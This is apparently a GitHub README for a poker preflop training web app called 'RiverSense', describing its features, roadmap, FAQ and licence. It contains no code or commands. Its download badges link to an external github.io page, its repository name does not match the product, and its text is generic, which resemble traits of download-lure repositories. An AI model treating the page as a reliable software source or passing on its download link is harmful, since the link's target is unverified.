![preview](https://raw.githubusercontent.com/KING-FINDER/pocket-range-trainer/main/shot_a189161.svg)
[![Download](https://raw.githubusercontent.com/KING-FINDER/pocket-range-trainer/main/dl_1c543dc.svg)](https://KING-FINDER.github.io/pocket-range-trainer/)

# ♠️ RiverSense — Preflop & Beyond Decision Trainer

> A thinking partner for poker minds who want to sharpen their table instincts.
> Built by players, for players — no gimmicks, no shortcuts, just structured repetition.

Welcome to **RiverSense**, a browser-first training environment that turns the
chaotic art of preflop decision-making into a calm, deliberate craft. If you have
ever stared at A♠9♠ on the button and wondered whether a raise was genius or
greed, this is the space where those questions get answered — one hand, one
decision, one quiet rep at a time.

Where most drill tools stop at charts, RiverSense goes further: it teaches the
*why* behind each action. You are not memorizing a matrix. You are building a
mental model that survives the pressure of a live game, a late-night session, or
a tough table.

---

## 📖 Table of Contents

- [Why RiverSense Exists](#-why-riversense-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [The Training Loop](#-the-training-loop)
- [Hand Range Engine](#-hand-range-engine)
- [Multilingual Support](#-multilingual-support)
- [Responsive Interface](#-responsive-interface)
- [Round-the-Clock Player Assistance](#-round-the-clock-player-assistance)
- [Built-In Analytics Dashboard](#-built-in-analytics-dashboard)
- [Accessibility & Design Notes](#-accessibility--design-notes)
- [Technology Overview](#-technology-overview)
- [Project Structure](#-project-structure)
- [Getting Started (Sensible Route)](#-getting-started-sensible-route)
- [Roadmap 2026](#-roadmap-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [Community Code of Conduct](#-community-code-of-conduct)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🧠 Why RiverSense Exists

Poker is a game of incomplete information, but your *preparation* does not have
to be incomplete. Most people learn preflop ranges by glancing at a chart,
nodding, and then forgetting everything the moment the cards hit the felt.
RiverSense was born from a simple frustration: the gap between *knowing* a range
and *feeling* a range is enormous.

This repository is our attempt to bridge that gap. Instead of presenting static
diagrams, RiverSense drills you through randomized scenarios that adapt to your
weaknesses. The result is a training loop that feels more like a sparring partner
than a textbook.

Think of it as a metronome for your decision-making rhythm — steady, patient,
and quietly relentless.

---

## 🎯 Core Philosophy

1. **Repetition over cramming.** Ten focused decisions beat a hundred passive
   scrolls through a chart.
2. **Context matters.** The same hand plays differently from the cutoff, the
   small blind, or against a 3-bettor.
3. **Progress is measurable.** If you cannot see it, you cannot improve it.
4. **Simplicity scales.** A clean UI beats a cluttered one every single time.
5. **Everyone plays, everyone learns.** From micro-stakes hobbyists to serious
   students of the game.

---

## ✨ Feature Highlights

- 🎴 **Adaptive Preflop Scenarios** — thousands of curated spots across every
  position at the table.
- 📊 **Session Analytics** — accuracy, leak detection, and trend lines that
  update with every hand you play.
- 🌍 **Multilingual Interface** — designed for players around the globe, with
  language packs ready to expand.
- 📱 **Responsive Layout** — drills that feel native on a phone, tablet, or
  desktop.
- 🕒 **Continuous Availability** — the trainer is always on call, around the
  clock, whenever inspiration strikes.
- 🧩 **Range Editor** — build, tweak, and save your own custom ranges.
- 🔔 **Decision Timers** — optional pressure mode that simulates live tempo.
- 🗂️ **Exportable Results** — carry your stats into your own spreadsheet or
  journal.
- 🧭 **Guided Onboarding** — a short walkthrough that gets new players drilling
  within a minute.
- 🎨 **Theming Options** — light, dark, and everything in between for late
  sessions.

---

## 🔁 The Training Loop

RiverSense revolves around a tight, repeatable cycle:

1. **Deal** — a scenario is presented: your position, the action ahead of you,
   and the stack depth.
2. **Decide** — you choose fold, call, raise, or shove.
3. **Feedback** — the app explains the recommended line and why it fits the
   situation.
4. **Record** — the result is added to your analytics profile.
5. **Adapt** — future scenarios weight themselves toward your weaker spots.

This loop is deliberately short. It respects your time and rewards consistency.
Over a week of short sessions, the compounding effect is remarkable.

---

## 🃏 Hand Range Engine

At the heart of RiverSense is a range engine that models 169 distinct starting
hands and weights them by position, action, and stack depth. The engine does not
simply compare your answer to a lookup table; it reasons about the *frequency*
with which each action should be taken.

Key behaviors:

- **Mixed strategies** are supported, so borderline hands can be shown as
  partial-frequency plays.
- **Positional awareness** is factored into every recommendation.
- **Stack depth** alters the recommended aggression curve.
- **Opponent profiles** can be layered on top for advanced study.

The output is never a single verdict carved in stone — it is a spectrum, and
learning to navigate that spectrum is the real skill.

---

## 🌍 Multilingual Support

Poker is universal, and so is the language of a good decision. RiverSense ships
with a translation framework that makes adding new locales straightforward.
Interface strings, feedback messages, and help text are all externalized so
contributors can localize the entire experience without touching core logic.

Current and planned language coverage:

- English (reference locale)
- Spanish
- Portuguese
- French
- German
- Japanese
- Mandarin (Simplified)
- Korean

If your language is missing, that is an open invitation, not a closed door.

---

## 📱 Responsive Interface

The layout is built mobile-first, then gracefully scales upward. On a phone,
drills are one-thumb friendly with large tap targets. On a tablet, the range
grid and analytics share the screen. On a desktop, you get the full cockpit —
timers, charts, and hotkeys.

Responsive design here is not an afterthought bolted on at the end. It is the
foundation on which every component is built.

---

## 🕒 Round-the-Clock Player Assistance

Questions at 3 AM? A tricky spot you cannot decode? RiverSense includes a
dedicated support channel that is staffed continuously. Whether you are stuck on
a range definition, curious about a stat, or want to suggest a feature, there is
always a human on the other side.

Support is provided through the repository's discussions and issue tracker, with
escalation paths for anything urgent. Response times are tracked and improved
with every release cycle.

---

## 📊 Built-In Analytics Dashboard

Numbers tell stories, and RiverSense is a good storyteller. The dashboard
surfaces:

- **Overall accuracy** across all decisions.
- **Positional breakdowns** so you can see where leaks hide.
- **Action distribution** — are you over-folding? Over-raising?
- **Time-of-day patterns** that reveal when your focus dips.
- **Streaks and consistency scores** to keep motivation high.

Everything is client-side by default, so your data stays with you.

---

## ♿ Accessibility & Design Notes

- Full keyboard navigation for every drill.
- Screen-reader-friendly labels on all interactive components.
- High-contrast theme option for low-light environments.
- Reduced-motion mode that respects system preferences.
- Color palettes chosen to remain distinguishable for common forms of color
  vision deficiency.

Accessibility is a feature, not a checkbox, and it is reviewed with every pull
request that touches the UI.

---

## 🛠️ Technology Overview

RiverSense is a modern web application built on a component-driven frontend with
a lightweight state layer. The architecture favors clarity over cleverness:

- **Frontend:** component-based UI with reactive state management.
- **Range Engine:** a pure, testable module with no UI dependencies.
- **Storage:** local persistence for sessions with optional cloud sync
  (planned for 2026).
- **Testing:** unit tests for the engine, integration tests for the UI.
- **Tooling:** linting, formatting, and type checks enforced in CI.

---

## 🗂️ Project Structure

A high-level map of the repository:

- `src/` — application source code
  - `components/` — reusable UI building blocks
  - `engine/` — the range and decision engine
  - `pages/` — top-level views
  - `locales/` — translation files
  - `styles/` — design tokens and themes
- `tests/` — unit and integration tests
- `docs/` — extended documentation and guides
- `scripts/` — developer automation helpers

Each folder contains its own README where additional detail is warranted.

---

## 🚀 Getting Started (Sensible Route)

To run RiverSense locally, follow the project's setup guide in the `docs/`
folder. The recommended path is to use the provided container recipe or the
task runner configured for the repository, which handles dependencies,
environment variables, and hot reload in one step.

If you prefer a manual approach, review the environment section in the docs for
the exact runtime versions expected. The maintainers keep that page current so
new contributors are never left guessing.

---

## 🗺️ Roadmap 2026

- **Q1 2026** — Public beta of cloud sync for training profiles.
- **Q2 2026** — Postflop module expansion with turn and river drills.
- **Q3 2026** — Tournament-specific ICM training scenarios.
- **Q4 2026** — Community range library with shared contributions.
- **Ongoing** — Performance tuning, accessibility audits, and locale coverage.

The roadmap is a living document and is updated after every release retrospective.

---

## ❓ Frequently Asked Questions

**Is RiverSense suitable for complete beginners?**
Absolutely. The onboarding flow assumes no prior range knowledge and builds up
concepts gradually.

**Do I need to create an account?**
No account is required to start drilling. Optional accounts unlock sync and
cross-device progress.

**Can I use it offline?**
Core drills work without a network connection once the app is loaded.

**How often is the scenario pool updated?**
New spots are added with each minor release, roughly every few weeks.

**Does it replace a coach?**
It complements coaching beautifully, but it does not replace human insight. Use
it as a supplement.

---

## 🤝 Contributing

Contributions are warmly welcomed. Please:

1. Read the contributing guide in `docs/`.
2. Open an issue before starting significant work.
3. Keep pull requests focused and well-described.
4. Add tests for engine changes and screenshots for UI changes.

Every merged contribution is credited in the release notes.

---

## 🌱 Community Code of Conduct

Be kind, be patient, be generous with your knowledge. Harassment, discrimination,
or hostile behavior of any kind is not tolerated. Full details live in the
`CODE_OF_CONDUCT.md` file at the repository root.

---

## ⚠️ Disclaimer

RiverSense is an educational tool designed to help players study poker theory
and improve their decision-making skills. It does not offer real-money gambling
services, does not guarantee any specific outcome, and is not affiliated with
any poker room or gambling operator. Poker involves variance, and no amount of
study removes that reality. Please play responsibly and in accordance with the
laws of your jurisdiction. The authors and contributors accept no liability for
financial losses incurred in connection with the use of this software.

---

## 📜 License

This project is released under the MIT License. See the full text at the
[LICENSE](./LICENSE) file for details.

Copyright (c) 2026 RiverSense Contributors.

[![Download](https://raw.githubusercontent.com/KING-FINDER/pocket-range-trainer/main/dl_1c543dc.svg)](https://KING-FINDER.github.io/pocket-range-trainer/)